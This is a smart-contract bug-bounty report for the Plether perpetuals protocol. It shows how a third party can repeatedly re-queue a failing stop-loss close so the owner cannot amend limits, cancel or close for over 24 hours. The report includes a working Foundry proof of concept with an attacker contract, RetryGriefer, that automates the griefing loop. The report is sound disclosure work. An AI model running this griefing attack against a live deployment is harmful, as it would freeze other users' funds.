# \#99671 [SC-High] Public protection retries lock owners out of fixing a latched stop-loss

**Submitted on Nov 14th 2026 at 18:55:08 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99671
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro
A stop-loss whose close attempt fails its own stored financial limits ends up `Latched`, and the only way for its owner to recover is to amend those limits with `amendLatchedPositionProtectionCloseLimits`, which works only while the protection is `Latched` and the account has no pending order. At the same time, `retryPositionProtectionClose` is open to anyone and immediately queues a new close attempt under the old limits, which puts the protection back into `Triggered`. A third party can process the doomed attempt and retry in the same transaction, so every time the owner looks the protection is `Triggered`, and the owner's amendment, cancellation and ordinary close all revert while the position stays open and exposed. In the PoC, which uses release parameters, the production router and protection book and only Pyth and USDG mocks, an owner whose stop-loss fails a 10,600 USDG notional ceiling after a jump from 1.00 to 1.10 follows the documented recovery route every hour for **25 hours** and is blocked every time, so the position and its margin cannot be exited for more than a day.

## Vulnerability Details
Take an owner with a 10,000-token LONG opened at 1.00 who arms a stop-loss with a `maxExecutionNotionalAssets` ceiling of 10,600 USDG. The basket jumps to 1.10 and the stop-loss triggers. Closing 10,000 tokens at 1.10 needs 11,000 USDG of notional, so the close attempt fails the owner's own ceiling and the protection moves to `Latched`. Nothing is wrong at this point: the owner simply wants to loosen the ceiling and get out.

The protocol gives the owner exactly one tool for that. `amendLatchedPositionProtectionCloseLimits` refuses anything other than a `Latched` protection with an empty order queue:

```solidity
// PositionProtectionBook.sol L315-L327
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The retry path, on the other hand, has no caller check at all. Any address can call `retryPositionProtectionClose` on a `Latched` protection, and it commits a new close attempt and records it, which flips the status back to `Triggered`:

```solidity
// PositionProtectionBook.sol L382-L406 (retryPositionProtectionClose, abridged)
StoredProtection storage protection = _activeProtection(protectionId);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
...
linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
    .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
...
_recordCloseAttempt(protection, linkedOrderId);
```

The new attempt is built from the limits already stored for the protection, so it carries the same ceiling that just failed:

```solidity
// OrderLiquidationBatchLogic.sol L663-L677 (_protectionCloseRequest)
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);
...
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

That attempt fails or expires without touching the position, and the protection latches again. Because executing or expiring the attempt is also permissionless, an attacker can do both steps in one transaction, terminalizing the doomed attempt and retrying straight away, so the `Latched` state never survives to a transaction boundary. While a retry is pending, the owner's amendment reverts with `ProtectionNotLatched`, `cancelPositionProtection` reverts with `ProtectionNotArmed`, and an ordinary close commit reverts with `ProtectionActive`. Retrying again does not help the owner either, because every retry reuses the stale ceiling.

Both actions are documented. The canonical entry points (CANONICAL_ENTRYPOINTS.md L142-L148) say that a `Latched` protection "may be retried permissionlessly" and that the owner may amend its close ceilings "when the account has no pending Router order". The problem is that one documented action can be used by a third party to take away the only state in which the other documented action works, again and again, so the owner's prescribed remedy keeps failing. The amendment route itself was added as the fix for Cecuro MED-9, where protection closes could be retried without the trader's financial limits. Tight limits failing after a gap is expected behaviour; an owner who cannot use the post-fix amendment route because someone else keeps retrying is new behaviour introduced by that fix.

An owner who tries to recover the normal way has to spend an extra transaction to terminalize the pending attempt (executing it, or expiring it after its deadline) and then send the amendment. In the PoC that terminalization call used 521,729 gas, including Foundry call overhead. If the attacker lands a retry between those two owner transactions, the amendment reverts again and the owner is back where it started. An EOA owner gets out only if its terminalization and amendment land back to back, in which case the amendment succeeds and the next retry uses the new limits, and a contract-wallet owner can terminalize and amend in one transaction. Whether an attacker can keep interposing on a live chain depends on transaction ordering and on the attacker continuing to pay gas.


## Impact Details

The owner's position, and the margin locked in it, cannot be exited for as long as the attacker keeps re-queuing the doomed attempt. While the protection is `Triggered`, the owner cannot amend the limits, cannot cancel the protection and cannot commit an ordinary close, and the position stays open and exposed to further price moves. The PoC keeps this going for 25 hours: every hour the owner tries to amend, terminalizes the expired attempt itself and tries to amend again, an attacker retry lands in between, and every amendment, cancellation and close attempt reverts. This is the in-scope High impact "Temporary freezing of funds for at least 24 hours".

Every failed recovery also costs the owner gas, and the attacker needs no capital, no special role and no control of the owner's account, only the gas for its own retries.

## Recommendation

Let the owner update the close limits while its own protection close attempt is pending, with the new limits applied to the next attempt, or add an owner-only call that terminalizes the pending attempt and amends the limits in one step, which also removes the EOA transaction-ordering race; a narrower option is a short owner-only grace period after each relatch during which `retryPositionProtectionClose` cannot be called by anyone else.

## References

The amendment works only while `Latched` with no pending order: [PositionProtectionBook.sol#L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol?plain=1#L315-L327)

Anyone can retry a latched protection, which moves it back to `Triggered`: [PositionProtectionBook.sol#L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol?plain=1#L382-L406)

Each retry reuses the stored close limits: [OrderLiquidationBatchLogic.sol#L657-L680](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol?plain=1#L657-L680)

The documented retry and amendment rules: [CANONICAL_ENTRYPOINTS.md#L142-L148](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L142-L148)


## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. The owner's open goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)`, the stop-loss is created, triggered, retried and amended through the production `PositionProtectionBook`, and attempts are executed or expired through the permissionless `router.executeOrder` and `router.expireOrder`. The LP deposit uses the public request → `router.settleLpEpoch` → claim flow. No protocol contract is impersonated. The attacker is a small helper contract defined in the test file, `RetryGriefer`, which calls only public functions; it lets the attacker terminalize the live attempt and retry in a single transaction. The test applies the release parameters from `DEPLOYMENT.md`, including the 4 bps execution fee and the 60-second execution window.

### Step-by-step (`test_RetryLoopBlocksOwnerAmendAndEveryExitFor24Hours`)

**Setup.** An LP deposits 1,000,000 USDG of Junior. On Tuesday 10:00 UTC the owner opens a 10,000-token LONG at 1.00 with 3,000 USDG of margin and arms a stop-loss at 1.05 with a `maxExecutionNotionalAssets` ceiling of 10,600 USDG.

**Latch.** The basket jumps to 1.10 and a keeper triggers the stop-loss. The close attempt needs 11,000 USDG of notional, fails with `ConstraintViolation`, and the protection latches with the position still open.

**First retry.** The attacker's helper calls `retryPositionProtectionClose`. The protection is `Triggered` again with the stored ceiling still at 10,600 USDG.

**Hourly loop.** Every hour for 25 hours a keeper refreshes the mark and the owner follows the documented route. Its amendment reverts with `ProtectionNotLatched`, its cancellation with `ProtectionNotArmed` and its ordinary close with `ProtectionActive`. The owner then expires the past-deadline attempt itself, which needs no price data and leaves the protection `Latched`. The attacker's retry lands before the owner's next transaction, and the amendment, cancellation and close all revert again.

**Result.** After 25 hours the position is still open, the ceiling was never amended, and the owner never had a chance to exit.

### Other scenarios covered by the test

`test_ThirdPartyRetryKeepsStaleCeilingAndBlocksOwner` shows the atomic form. The attacker's helper executes the live doomed attempt with a valid price payload and retries in the same transaction three times in a row, and after each of those transactions the protection is `Triggered`, the stored ceiling is unchanged, and the owner's amendment, cancellation and close all revert.

`test_AttackerInterposesBetweenEoaRecoveryTransactions` has the owner execute the pending attempt itself as a first recovery transaction, which uses 521,729 gas and leaves the protection `Latched`. An attacker retry then lands before the owner's second transaction, and the amendment reverts again with the ceiling still at 10,600 USDG.

`test_EoaOwnerEscapesWithTwoConsecutiveTransactions` is the control. When the owner's terminalization and amendment land back to back, the amendment raises the ceiling to 12,000 USDG, and the next retry, even one sent by the attacker, executes and closes the position.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/LatchedProtectionRetryGrief.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/LatchedProtectionRetryGrief.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 4 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Attacker helper. In one transaction it terminalizes the protection's live doomed attempt (if any) and
///         immediately re-queues a new attempt through the permissionless `retryPositionProtectionClose`. It uses only
///         public entry points and holds no privileges.
contract RetryGriefer {

    function repin(
        OrderRouter router,
        IPositionProtectionActions actions,
        uint64 protectionId,
        uint64 liveAttempt,
        bytes[] calldata executeData
    ) external returns (uint64 nextAttempt) {
        if (liveAttempt != 0) {
            if (executeData.length == 0) {
                router.expireOrder(liveAttempt);
            } else {
                router.executeOrder(liveAttempt, executeData);
            }
        }
        nextAttempt = actions.retryPositionProtectionClose(protectionId);
    }

}

/// @title Permissionless protection retries keep a latched stop-loss out of reach of the owner's close-limit amendment
/// @notice An owner's stop-loss close fails its stored `maxExecutionNotionalAssets` ceiling after a price jump and the
///         protection latches. The owner may amend the ceiling only while the protection is `Latched` and the account
///         has no pending order, but anyone can call `retryPositionProtectionClose`, which queues a new attempt with
///         the same stale ceiling and moves the protection back to `Triggered`. While it is `Triggered`, the owner's
///         amendment, cancellation and ordinary close all revert.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Production V3 `commitOrder`, the production
///      PositionProtectionBook and permissionless `executeOrder` / `expireOrder` / `updateMarkPrice` /
///      `settleLpEpoch`. Pyth and USDG are the only mocks. No contract under src/ is modified or impersonated.
contract LatchedProtectionRetryGriefTest is BasePerpTest {

    address internal constant OWNER = address(0xA11CE); // protected trader (EOA)
    address internal constant KEEPER = address(0xBEEF); // honest keeper
    address internal constant LP = address(0x1B);

    uint256 internal constant ENTRY = 1e8; // 1.00
    uint256 internal constant STOP = 1.05e8; // LONG loses when the basket rises: stop-loss above entry
    uint256 internal constant JUMP = 1.1e8; // 1.10
    uint256 internal constant SIZE = 10_000e18; // 10,000 tokens
    uint256 internal constant NOTIONAL_CEILING = 10_600e6; // closing at 1.10 needs 11,000 USDG of notional
    uint256 internal constant TUE_NOV10_1000 = 1_794_304_800; // Tue 2026-11-10 10:00:00 UTC (regular trading)

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views;
    RetryGriefer internal griefer;

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new RetryGriefer();

        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        _publicJuniorDeposit(LP, 1_000_000e6);

        _goto(TUE_NOV10_1000); // Tuesday 10:00 UTC; the 25-hour loop below ends on Wednesday
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(router.maxExecutionWindowSeconds(), 60, "release execution window");
        _markNow(ENTRY);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(price)), 0, -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _markNow(
        uint256 price
    ) internal {
        vm.prank(KEEPER);
        router.updateMarkPrice(_tick(price, vm.getBlockTimestamp()));
    }

    function _publicJuniorDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _goto(juniorVault.depositEpochStart(requestId));
        vm.prank(KEEPER);
        router.settleLpEpoch(_tick(ENTRY, vm.getBlockTimestamp()));
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(OWNER, router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: 0,
            targetPrice: type(uint256).max,
            isClose: true,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _limits(
        uint256 maxNotional
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = maxNotional;
        l.maxGrossAccountDebitAssets = type(uint256).max;
        l.maxActionChargeAssets = type(uint256).max;
        l.maxExplicitFeesAssets = type(uint256).max;
    }

    function _status(
        uint64 id
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views.getPositionProtection(id).status;
    }

    function _size() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(OWNER);
    }

    function _commitTime(
        uint64 orderId
    ) internal view returns (uint256) {
        return router.lifecycleBook().orderTiming(orderId).commitTimestamp;
    }

    function _deadline(
        uint64 orderId
    ) internal view returns (uint256) {
        return router.lifecycleBook().orderTiming(orderId).executionDeadline;
    }

    /// @dev Payload a keeper uses to execute `orderId`: the first tick after its commit, at 1.10.
    function _attemptTick(
        uint64 orderId
    ) internal view returns (bytes[] memory) {
        return _tick(JUMP, _commitTime(orderId) + 1);
    }

    /// The owner opens a 10,000-token LONG at 1.00 and arms a stop-loss at 1.05 with a 10,600 USDG execution-notional
    /// ceiling. The basket jumps to 1.10, a keeper triggers the stop-loss, and the attempt fails the ceiling
    /// (11,000 > 10,600). The protection latches.
    function _latchedStopLoss() internal returns (uint64 id, uint64 failedAttempt) {
        _fundTrader(OWNER, 20_000e6);
        OrderV3Types.OrderRequest memory open = _openRequest();
        vm.prank(OWNER);
        uint64 openId = IPerpsTraderActions(address(router)).commitOrder(open);
        uint256 c = vm.getBlockTimestamp();
        _goto(c + 1);
        vm.prank(KEEPER);
        router.executeOrder(openId, _tick(ENTRY, c + 1));
        assertEq(_size(), SIZE, "LONG opened");

        _goto(vm.getBlockTimestamp() + 1);
        _markNow(ENTRY);
        PositionProtectionTypes.PositionProtectionParams memory p;
        p.stopLossTriggerPrice = STOP;
        p.closeLimits = _limits(NOTIONAL_CEILING);
        vm.prank(OWNER);
        id = actions.createPositionProtection(p);
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Armed), "armed");

        _goto(vm.getBlockTimestamp() + 5);
        vm.prank(KEEPER);
        failedAttempt = actions.triggerPositionProtection(id, _tick(JUMP, vm.getBlockTimestamp()));
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "triggered");

        _goto(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _attemptTick(failedAttempt);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(failedAttempt, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt failed");
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ceiling");
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        assertEq(_size(), SIZE, "position still open");
    }

    function _openRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request = _closeRequest();
        request.isClose = false;
        request.marginDelta = 3000e6;
        request.targetPrice = 1;
    }

    function _ownerAmendReverts(
        uint64 id
    ) internal {
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(id, _limits(type(uint256).max));
    }

    function _ownerFullyBlocked(
        uint64 id
    ) internal {
        _ownerAmendReverts(id);
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtection(id);
        OrderV3Types.OrderRequest memory close = _closeRequest();
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        IPerpsTraderActions(address(router)).commitOrder(close);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice A third party re-queues the doomed attempt with the stale ceiling. Processing the attempt and retrying
    ///         happen in one transaction, so at every transaction boundary the owner sees `Triggered`, and the
    ///         amendment, cancellation and ordinary close all revert.
    function test_ThirdPartyRetryKeepsStaleCeilingAndBlocksOwner() public {
        (uint64 id,) = _latchedStopLoss();

        uint64 attempt = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0));
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "re-pinned");
        assertEq(views.closeFinancialLimits(id).maxExecutionNotionalAssets, NOTIONAL_CEILING, "stale ceiling");
        _ownerFullyBlocked(id);

        for (uint256 i; i < 3; ++i) {
            _goto(vm.getBlockTimestamp() + 1);
            attempt = griefer.repin(OrderRouter(address(router)), actions, id, attempt, _attemptTick(attempt));
            assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered");
            _ownerFullyBlocked(id);
        }
        assertEq(_size(), SIZE, "position still open and exposed");
        console2.log("atomic execute-and-retry cycles, owner blocked after each", uint256(3));
    }

    /// @notice An EOA owner terminalizes the pending attempt itself (transaction 1). A third-party retry lands before
    ///         the owner's amendment (transaction 2), which reverts again.
    function test_AttackerInterposesBetweenEoaRecoveryTransactions() public {
        (uint64 id,) = _latchedStopLoss();
        uint64 attempt = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0));
        _goto(vm.getBlockTimestamp() + 1);

        bytes[] memory data = _attemptTick(attempt);
        vm.prank(OWNER);
        uint256 g0 = gasleft();
        router.executeOrder(attempt, data); // owner transaction 1
        uint256 gasUsed = g0 - gasleft();
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        console2.log("gas of the owner's extra terminalization call", gasUsed);

        griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0)); // attacker lands in between
        _ownerAmendReverts(id); // owner transaction 2
        assertEq(views.closeFinancialLimits(id).maxExecutionNotionalAssets, NOTIONAL_CEILING, "still stale");
    }

    /// @notice Control: if the owner's two recovery transactions land back to back, the amendment succeeds and the
    ///         next retry, even one sent by the attacker, uses the new ceiling and closes the position.
    function test_EoaOwnerEscapesWithTwoConsecutiveTransactions() public {
        (uint64 id,) = _latchedStopLoss();
        uint64 attempt = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0));
        _goto(vm.getBlockTimestamp() + 1);

        bytes[] memory data = _attemptTick(attempt);
        vm.prank(OWNER);
        router.executeOrder(attempt, data);
        vm.prank(OWNER);
        actions.amendLatchedPositionProtectionCloseLimits(id, _limits(12_000e6));

        uint64 fresh = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0));
        _goto(vm.getBlockTimestamp() + 1);
        data = _attemptTick(fresh);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(fresh, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "retry with the new ceiling executes");
        assertEq(_size(), 0, "position closed");
    }

    /// @notice Sustained loop. For 25 hours, every hour, the owner follows the documented route: it tries to amend,
    ///         terminalizes the expired attempt itself, and tries to amend again. Each time a third-party retry lands
    ///         between the owner's transactions. The amendment, cancellation and ordinary close revert throughout and
    ///         the position cannot be exited.
    function test_RetryLoopBlocksOwnerAmendAndEveryExitFor24Hours() public {
        (uint64 id,) = _latchedStopLoss();
        uint256 start = vm.getBlockTimestamp();
        uint64 attempt = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0));

        for (uint256 hour = 1; hour <= 25; ++hour) {
            _goto(start + hour * 1 hours);
            _markNow(JUMP);
            assertGt(vm.getBlockTimestamp(), _deadline(attempt), "pending attempt is past its deadline");
            _ownerFullyBlocked(id); // still Triggered: the expired attempt has not been terminalized

            vm.prank(OWNER);
            router.expireOrder(attempt); // owner transaction 1, no price data needed
            assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");

            attempt = griefer.repin(OrderRouter(address(router)), actions, id, 0, new bytes[](0)); // interposed
            _ownerFullyBlocked(id); // owner transaction 2 and the other exits fail again
            assertEq(_size(), SIZE, "position still open");
        }
        console2.log("hours the owner could not amend, cancel or close", (vm.getBlockTimestamp() - start) / 1 hours);
        assertGe(vm.getBlockTimestamp() - start, 24 hours, "blocked for at least 24 hours");
        assertEq(views.closeFinancialLimits(id).maxExecutionNotionalAssets, NOTIONAL_CEILING, "ceiling never amended");
    }

}
```

